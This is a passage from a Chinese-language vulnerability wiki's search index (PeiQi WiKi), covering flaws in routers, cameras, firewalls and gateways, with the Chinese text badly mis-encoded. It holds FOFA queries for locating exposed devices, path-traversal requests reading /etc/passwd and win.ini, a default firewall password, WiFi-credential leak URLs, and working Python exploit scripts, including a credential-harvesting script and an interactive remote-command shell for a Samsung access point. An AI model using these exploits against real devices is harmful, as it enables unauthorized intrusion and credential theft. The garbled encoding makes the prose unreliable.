ä¸ºè®¿é—®çš„æ˜¯è·¯ç”±çš„é…ç½®é¡µé¢ï¼Œé…ç½®åè·å–åå°æƒé™ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/TVTæ•°ç ç§‘æŠ€/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/TVTæ•°ç ç§‘æŠ€/","title":"TVTæ•°ç ç§‘æŠ€","keywords":"","body":"TVTæ•°ç ç§‘æŠ€ TVTæ•°ç ç§‘æŠ€ NVMS-1000 è·¯å¾„éå†æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-12 13:05:55 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/TVTæ•°ç ç§‘æŠ€/TVTæ•°ç ç§‘æŠ€ NVMS-1000 è·¯å¾„éå†æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/TVTæ•°ç ç§‘æŠ€/TVTæ•°ç ç§‘æŠ€ NVMS-1000 è·¯å¾„éå†æ¼æ´.html","title":"TVTæ•°ç ç§‘æŠ€ NVMS-1000 è·¯å¾„éå†æ¼æ´","keywords":"","body":"TVTæ•°ç ç§‘æŠ€ NVMS-1000 è·¯å¾„éå†æ¼æ´ æ¼æ´æè¿° TVTæ•°ç ç§‘æŠ€ TVT NVMS-1000æ˜¯ä¸­å›½TVTæ•°ç ç§‘æŠ€å…¬å¸çš„ä¸€å¥—ç½‘ç»œç›‘æ§è§†é¢‘ç®¡ç†ç³»ç»Ÿã€‚ TVTæ•°ç ç§‘æŠ€ TVT NVMS-1000ä¸­å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚è¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡å‘é€åŒ…å«/../çš„ç‰¹åˆ¶URLè¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´æŸ¥çœ‹ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚ æ¼æ´å½±å“ [!NOTE] TVT NVMS-1000 FOFA [!NOTE] app=\"TVT-NVMS-1000\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€è¯·æ±‚åŒ…è¯»å–æ–‡ä»¶ GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/èœ‚ç½‘äº’è”/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/èœ‚ç½‘äº’è”/","title":"èœ‚ç½‘äº’è”","keywords":"","body":"èœ‚ç½‘äº’è” èœ‚ç½‘äº’è” ä¼ä¸šçº§è·¯ç”±å™¨v4.31 å¯†ç æ³„éœ²æ¼æ´ CVE-2019-16313 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-21 10:54:45 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/èœ‚ç½‘äº’è”/èœ‚ç½‘äº’è” ä¼ä¸šçº§è·¯ç”±å™¨v4.31 å¯†ç æ³„éœ²æ¼æ´ CVE-2019-16313.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/èœ‚ç½‘äº’è”/èœ‚ç½‘äº’è” ä¼ä¸šçº§è·¯ç”±å™¨v4.31 å¯†ç æ³„éœ²æ¼æ´ CVE-2019-16313.html","title":"èœ‚ç½‘äº’è” ä¼ä¸šçº§è·¯ç”±å™¨v4.31 å¯†ç æ³„éœ²æ¼æ´ CVE-2019-16313","keywords":"","body":"èœ‚ç½‘äº’è” ä¼ä¸šçº§è·¯ç”±å™¨v4.31 å¯†ç æ³„éœ²æ¼æ´ CVE-2019-16313 æ¼æ´æè¿° èœ‚ç½‘äº’è”ä¼ä¸šçº§è·¯ç”±å™¨v4.31å­˜åœ¨æ¥å£æœªæˆæƒè®¿é—®ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ˜¯é€šè¿‡æ­¤æ¼æ´å¾—åˆ°è·¯ç”±å™¨è´¦å·å¯†ç æ¥ç®¡è·¯ç”±å™¨ æ¼æ´å½±å“ [!NOTE] èœ‚ç½‘äº’è”ä¼ä¸šçº§è·¯ç”±å™¨v4.31 FOFA [!NOTE] app=\"èœ‚ç½‘äº’è”-äº’è”ä¼ä¸šçº§è·¯ç”±å™¨\" æ¼æ´å¤ç° ç™»å½•é¡µé¢ç™»å½•åå¯ä»¥çœ‹åˆ°ï¼Œè´¦å·å¯†ç å­˜åœ¨æ¥å£è®¿é—® è€Œ /action/usermanager.htm å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œå¯é€šè¿‡ç›´æ¥è®¿é—®è·å¾—è´¦å·å¯†ç  [!NOTE] ä¸å­˜åœ¨æ¼æ´æ—¶ stateå€¼ä¸º 3 æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: DrayTekä¼ä¸šç½‘ç»œè®¾å¤‡ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/action/usermanager.htm\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] æ­£åœ¨è¯·æ±‚ {}/action/usermanager.htm \\033[0m\".format(target_url)) if \"pwd\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ IFW8Enterprise_router_Password_leakage PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­ç§‘ç½‘å¨/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­ç§‘ç½‘å¨/","title":"ä¸­ç§‘ç½‘å¨","keywords":"","body":"ä¸­ç§‘ç½‘å¨ ä¸­ç§‘ç½‘å¨ ä¸‹ä¸€ä»£é˜²ç«å¢™æ§åˆ¶ç³»ç»Ÿ è´¦å·å¯†ç æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 18:57:16 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­ç§‘ç½‘å¨/ä¸­ç§‘ç½‘å¨ ä¸‹ä¸€ä»£é˜²ç«å¢™æ§åˆ¶ç³»ç»Ÿ è´¦å·å¯†ç æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸­ç§‘ç½‘å¨/ä¸­ç§‘ç½‘å¨ ä¸‹ä¸€ä»£é˜²ç«å¢™æ§åˆ¶ç³»ç»Ÿ è´¦å·å¯†ç æ³„éœ²æ¼æ´.html","title":"ä¸­ç§‘ç½‘å¨ ä¸‹ä¸€ä»£é˜²ç«å¢™æ§åˆ¶ç³»ç»Ÿ è´¦å·å¯†ç æ³„éœ²æ¼æ´","keywords":"","body":"ä¸­ç§‘ç½‘å¨ ä¸‹ä¸€ä»£é˜²ç«å¢™æ§åˆ¶ç³»ç»Ÿ è´¦å·å¯†ç æ³„éœ²æ¼æ´ æ¼æ´æè¿° ä¸­ç§‘ç½‘å¨ ä¸‹ä¸€ä»£é˜²ç«å¢™æ§åˆ¶ç³»ç»Ÿ å­˜åœ¨è´¦å·å¯†ç æ³„éœ²æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡å‰ç«¯è·å–å¯†ç çš„Md5åè§£å¯†å¯è·å–å®Œæ•´å¯†ç ç™»é™†åå° æ¼æ´å½±å“ [!NOTE] ä¸­ç§‘ç½‘å¨ ä¸‹ä¸€ä»£é˜²ç«å¢™æ§åˆ¶ç³»ç»Ÿ FOFA [!NOTE] body=\"Get_Verify_Info(hex_md5(user_string).\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ F12æŸ¥çœ‹å‰ç«¯å‘ç° adminçš„md5åŠ å¯†å¯†ç  è§£å¯†åç™»å½•åå° PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-02 16:48:17 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/è²åŠ›å°”/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/è²åŠ›å°”/","title":"è²åŠ›å°”","keywords":"","body":"è²åŠ›å°” FLIR-AX8 download.php ä»»æ„æ–‡ä»¶ä¸‹è½½ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-09 14:46:23 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/è²åŠ›å°”/FLIR-AX8 download.php ä»»æ„æ–‡ä»¶ä¸‹è½½.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/è²åŠ›å°”/FLIR-AX8 download.php ä»»æ„æ–‡ä»¶ä¸‹è½½.html","title":"FLIR-AX8 download.php ä»»æ„æ–‡ä»¶ä¸‹è½½","keywords":"","body":"FLIR-AX8 download.php ä»»æ„æ–‡ä»¶ä¸‹è½½ æ¼æ´æè¿° FLIR-AX8 download.phpæ–‡ä»¶è¿‡æ»¤ä¸å…¨ å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ æ¼æ´å½±å“ [!NOTE] FLIR-AX8 FOFA [!NOTE] app=\"FLIR-FLIR-AX8\" æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º download.php \"application/octet-stream\", \"zip\" => \"application/zip\", \"mp3\" => \"audio/mpeg\", \"mpg\" => \"video/mpeg\", \"avi\" => \"video/x-msvideo\", ); $ctype = isset($content_types[$file_ext]) ? $content_types[$file_ext] : $ctype_default; header(\"Content-Type: \" . $ctype); //check if http_range is sent by browser (or download manager) if(isset($_SERVER['HTTP_RANGE'])) { list($size_unit, $range_orig) = explode('=', $_SERVER['HTTP_RANGE'], 2); if ($size_unit == 'bytes') { //multiple ranges could be specified at the same time, but for simplicity only serve the first range //http://tools.ietf.org/id/draft-ietf-http-range-retrieval-00.txt list($range, $extra_ranges) = explode(',', $range_orig, 2); } else { $range = ''; header('HTTP/1.1 416 Requested Range Not Satisfiable'); exit; } } else { $range = ''; } //figure out download piece from range (if set) list($seek_start, $seek_end) = explode('-', $range, 2); ob_clean(); //set start and end based on range (if set), else set defaults //also check for invalid ranges. $seek_end = (empty($seek_end)) ? ($file_size - 1) : min(abs(intval($seek_end)),($file_size - 1)); $seek_start = (empty($seek_start) || $seek_end 0 || $seek_end ç®€å•å®¡è®¡å¯ä»¥å‘ç° fileå‚æ•° ä¸ºå¯æ§å‚æ•°ä¸”æ²¡æœ‰è¿‡æ»¤å‚æ•°ï¼Œå¯¼è‡´å¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶ /download.php?file=/etc/passwd PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/æœ—è§†/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/æœ—è§†/","title":"æœ—è§†","keywords":"","body":"æœ—è§† æœ—è§† TG400 GSM ç½‘å…³ç›®å½•éå† CVE-2021-27328 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-31 19:22:36 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/æœ—è§†/æœ—è§† TG400 GSM ç½‘å…³ç›®å½•éå†  CVE-2021-27328.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/æœ—è§†/æœ—è§† TG400 GSM ç½‘å…³ç›®å½•éå†  CVE-2021-27328.html","title":"æœ—è§† TG400 GSM ç½‘å…³ç›®å½•éå†  CVE-2021-27328","keywords":"","body":"æœ—è§† TG400 GSM ç½‘å…³ç›®å½•éå† CVE-2021-27328 æ¼æ´æè¿° æœ—è§† TG400 GSM ç½‘å…³å­˜åœ¨ç›®å½•éå† ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¼æ´è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] æœ—è§† TG400 GSM ç½‘å…³ æ¼æ´å¤ç° æš‚æ— FOFAè¯­å¥åŠå›ºä»¶è®¾å¤‡å¤ç° è·å–å›ºä»¶è§£å¯†å¯†ç  http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect /etc/passwdï¼š http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd å‚è€ƒæ–‡ç«  https://github.com/SQSamir/CVE-2021-27328 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-31 19:32:45 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸‰æ˜Ÿ/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸‰æ˜Ÿ/","title":"ä¸‰æ˜Ÿ","keywords":"","body":"ä¸‰æ˜Ÿ ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-31 20:13:25 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸‰æ˜Ÿ/ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨  è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/ä¸‰æ˜Ÿ/ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨  è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨  è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨ è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨ å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå¯åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„å‘½ä»¤è·å–æœåŠ¡å™¨æƒé™ æ¼æ´å½±å“ [!NOTE] ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨ FOFA [!NOTE] title==\"Samsung WLAN AP\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ è¯·æ±‚åŒ…å¦‚ä¸‹ POST /(download)/tmp/a.txt HTTP/1.1 Host: 175.199.182.152 Connection: close Content-Length: 48 command1=shell:cat /etc/passwd| dd of=/tmp/a.txt æ¼æ´åˆ©ç”¨POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: ä¸‰æ˜Ÿ WLAN AP WEA453eè·¯ç”±å™¨ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:cat /etc/passwd| dd of=/tmp/a.txt\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"root\" in response.text and response.status_code == 200: print(\"\\033[36m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´, å“åº”ä¸º:\\n{}\\033[0m\".format(target_url, response.text)) while True: cmd = str(input(\"\\033[35mCmd >>> \\033[0m\")) POC_2(target_url, cmd) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨é»˜è®¤ç®¡ç†å‘˜å¼±å£ä»¤ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"command1=shell:{}| dd of=/tmp/a.txt\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[36m{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Samsung_WLAN_AP_wea453e_router_RCE PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é£é±¼æ˜Ÿ/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é£é±¼æ˜Ÿ/","title":"é£é±¼æ˜Ÿ","keywords":"","body":"é£é±¼æ˜Ÿ é£é±¼æ˜Ÿ å®¶ç”¨æ™ºèƒ½è·¯ç”± cookie.cgi æƒé™ç»•è¿‡ é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ æƒé™ç»•è¿‡ä¿¡æ¯æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-19 21:20:17 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é£é±¼æ˜Ÿ/é£é±¼æ˜Ÿ å®¶ç”¨æ™ºèƒ½è·¯ç”± cookie.cgi æƒé™ç»•è¿‡.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é£é±¼æ˜Ÿ/é£é±¼æ˜Ÿ å®¶ç”¨æ™ºèƒ½è·¯ç”± cookie.cgi æƒé™ç»•è¿‡.html","title":"é£é±¼æ˜Ÿ å®¶ç”¨æ™ºèƒ½è·¯ç”± cookie.cgi æƒé™ç»•è¿‡","keywords":"","body":"é£é±¼æ˜Ÿ å®¶ç”¨æ™ºèƒ½è·¯ç”± cookie.cgi æƒé™ç»•è¿‡ æ¼æ´æè¿° é£é±¼æ˜Ÿ å®¶ç”¨æ™ºèƒ½è·¯ç”±å­˜åœ¨æƒé™ç»•è¿‡ï¼Œé€šè¿‡Dropç‰¹å®šçš„è¯·æ±‚åŒ…è®¿é—®æœªæˆæƒçš„ç®¡ç†å‘˜é¡µé¢ æ¼æ´å½±å“ [!NOTE] é£é±¼æ˜Ÿ å®¶ç”¨æ™ºèƒ½è·¯ç”± é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title=\"é£é±¼æ˜Ÿå®¶ç”¨æ™ºèƒ½è·¯ç”±\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ è®¿é—® index.html æ—¶ä¼šè¯·æ±‚ cookie.cgi http://xxx.xxx.xxx.xxx/index.html é¡µé¢æŠ“åŒ… Dropæ‰ cookie.cgi è·³è½¬åå°è·å–äº†æƒé™ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é£é±¼æ˜Ÿ/é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ æƒé™ç»•è¿‡ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/é£é±¼æ˜Ÿ/é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ æƒé™ç»•è¿‡ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ æƒé™ç»•è¿‡ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ æƒé™ç»•è¿‡ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ å­˜åœ¨æƒé™ç»•è¿‡ä»¥åŠä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œå¯ä»¥è·å–ç®¡ç†å‘˜æƒé™ä»¥åŠç”¨æˆ·å¯†ç  æ¼æ´å½±å“ [!NOTE] é£é±¼æ˜Ÿ ä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ FOFA [!NOTE] title=\"é£é±¼æ˜Ÿä¼ä¸šçº§æ™ºèƒ½ä¸Šç½‘è¡Œä¸ºç®¡ç†ç³»ç»Ÿ\" æ¼æ´å¤ç° æƒé™ç»•è¿‡å‚è€ƒä¸Šä¸€ç¯‡ é£é±¼æ˜Ÿ å®¶ç”¨æ™ºèƒ½è·¯ç”± cookie.cgi æƒé™ç»•è¿‡ ä¿¡æ¯æ³„éœ²POC /request_para.cgi?parameter=wifi_info #è·å–ALL WIFIè´¦å·å¯†ç  /request_para.cgi?parameter=wifi_get_5g_host #è·å–5GWIFIè´¦å·å¯†ç  /request_para.cgi?parameter=wifi_get_2g_host #è·å–2GWIFIè´¦å·å¯†ç  Goby & POC [!NOTE] Adslr Enterprise online behavior management system Information leakage PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å¯æ˜æ˜Ÿè¾°/":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å¯æ˜æ˜Ÿè¾°/","title":"å¯æ˜æ˜Ÿè¾°","keywords":"","body":"å¯æ˜æ˜Ÿè¾° å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ å¼±å£ä»¤æ¼æ´ CNVD-2021-12793 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-16 19:02:18 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å¯æ˜æ˜Ÿè¾°/å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ é»˜è®¤å£ä»¤æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å¯æ˜æ˜Ÿè¾°/å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ é»˜è®¤å£ä»¤æ¼æ´.html","title":"å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ é»˜è®¤å£ä»¤æ¼æ´","keywords":"","body":"å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ å¼±å£ä»¤æ¼æ´ æ¼æ´æè¿° å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰â»¢USGé˜²â½•å¢™ å­˜åœ¨é»˜è®¤å£ä»¤æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡è´¦å·å¯†ç å¯ä»¥è¿›å…¥åå° æ¼æ´å½±å“ [!NOTE] å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ FOFA [!NOTE] title=\"å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™\" æ¼æ´å¤ç° é»˜è®¤å£ä»¤ è´¦å·ï¼šuseradmin å¯†ç ï¼švenus.user æˆåŠŸç™»å½• PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å¯æ˜æ˜Ÿè¾°/å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ é€»è¾‘ç¼ºé™·æ¼æ´.html":{"url":"PeiQi_Wiki/ç½‘ç»œè®¾å¤‡æ¼æ´/å¯æ˜æ˜Ÿè¾°/å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ é€»è¾‘ç¼ºé™·æ¼æ´.html","title":"å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ é€»è¾‘ç¼ºé™·æ¼æ´","keywords":"","body":"å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™ é€»è¾‘ç¼ºé™·æ¼æ´ æ¼æ´æè¿° å¯æ˜æ˜Ÿè¾° å¤©æ¸…æ±‰â»¢USGé˜²â½•å¢™ å­˜åœ¨é€»è¾‘ç¼ºé™·æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡è´¦å·å¯†ç 